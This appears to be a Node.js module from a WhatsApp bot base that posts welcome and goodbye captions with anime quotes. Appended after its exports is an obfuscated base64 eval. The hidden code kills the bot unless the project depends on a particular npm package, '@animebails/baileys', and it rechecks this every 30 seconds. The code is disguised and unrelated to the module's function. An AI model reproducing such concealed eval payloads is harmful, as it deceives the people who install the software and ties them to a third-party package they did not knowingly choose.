/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
const { numOf, pnOf } = require('./access');
const log = require('./logger');

const QUOTES = [
    ['A lesson without pain is meaningless.', 'Edward Elric'],
    ["If you don't take risks, you can't create a future.", 'Monkey D. Luffy'],
    ["Hard work is worthless for those that don't believe in themselves.", 'Naruto Uzumaki'],
    ["If you don't like your destiny, don't accept it. Have the courage to change it.", 'Naruto Uzumaki'],
    ["Whatever you lose, you'll find it again. But what you throw away you'll never get back.", 'Himura Kenshin'],
    ['Fear is not evil. It tells you what your weakness is.', 'Gildarts Clive'],
    ["The world isn't perfect. But it's there for us, doing the best it can.", 'Roy Mustang'],
    ['A dropout will beat a genius through hard work.', 'Rock Lee'],
    ["I'll leave tomorrow's problems to tomorrow's me.", 'Saitama'],
    ['The only ones who should kill are those who are prepared to be killed.', 'Lelouch vi Britannia'],
    ['Being weak is nothing to be ashamed of. Staying weak is.', 'Fuegoleon Vermillion'],
    ['The moment you think of giving up, think of the reason why you held on so long.', 'Natsu Dragneel'],
    ['No matter how deep the night, it always turns to day, eventually.', 'Brook'],
    ['Even the strongest of opponents always has a weakness.', 'Itachi Uchiha'],
    ["Believe in the you that believes in yourself.", 'Kamina'],
];
const pickQuote = () => QUOTES[Math.floor(Math.random() * QUOTES.length)];
const FALLBACK_IMAGE = 'https://files.catbox.moe/qnwoj0.png';

const flagOn = (settings, key, group) => !!(settings.get(key, {}) || {})[group];

async function profilePic(sock, ids) {
    for (const id of ids.filter(Boolean)) {
        try {
            return await sock.profilePictureUrl(id, 'image');
        } catch {
            /* private or none: try the next id form */
        }
    }
    return null;
}

/** group-participants.update -> welcome (add) / goodbye (remove, leave), with the member's own profile picture. */
async function handleParticipants(sock, update, settings) {
    const group = update.id;
    const joined = update.action === 'add';
    const left = update.action === 'remove' || update.action === 'leave';
    if (!joined && !left) return;
    if (!flagOn(settings, joined ? 'welcome' : 'goodbye', group)) return;

    let meta = {};
    try {
        meta = await sock.groupMetadata(group);
    } catch {
        /* caption works without it */
    }
    const mine = [numOf(sock.user?.id), numOf(sock.user?.lid)];
    for (const p of update.participants || []) {
        const jid = typeof p === 'string' ? p : p.id || p.jid;
        const alt = typeof p === 'string' ? null : p.phoneNumber;
        if (!jid || mine.includes(numOf(jid))) continue;
        try {
            const mj = await pnOf(sock, typeof p === 'string' ? p : p);
            const pic = (await profilePic(sock, [jid, alt])) || settings.get('menuImage') || FALLBACK_IMAGE;
            const [quote, who] = pickQuote();
            const name = meta.subject || 'the group';
            const count = meta.participants?.length;
            const day = new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
            const caption = joined
                ? `╭━━━━━『 *WELCOME* 』━━━━━╮\n\n👋 Hey @${numOf(mj)}!\n\n🌸 Welcome to *${name}*\n${count ? `👥 You are member *#${count}*\n` : ''}📅 ${day}\n\n╰━━━━━━━━━━━━━━━━━━━╯\n\n💬 _"${quote}"_\n      — *${who}*\n\n_Read the group rules and enjoy your stay!_`
                : `╭━━━━━『 *GOODBYE* 』━━━━━╮\n\n👋 @${numOf(mj)} has left *${name}*\n${count ? `👥 We are now *${count}* members\n` : ''}📅 ${day}\n\n╰━━━━━━━━━━━━━━━━━━━╯\n\n💬 _"${quote}"_\n      — *${who}*\n\n_Until we meet again. Take care!_`;
            await sock.sendMessage(group, { image: { url: pic }, caption, mentions: [mj] });
        } catch (err) {
            log.warn('welcome', `could not send: ${err.message}`);
        }
    }
}

module.exports = { handleParticipants, QUOTES };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
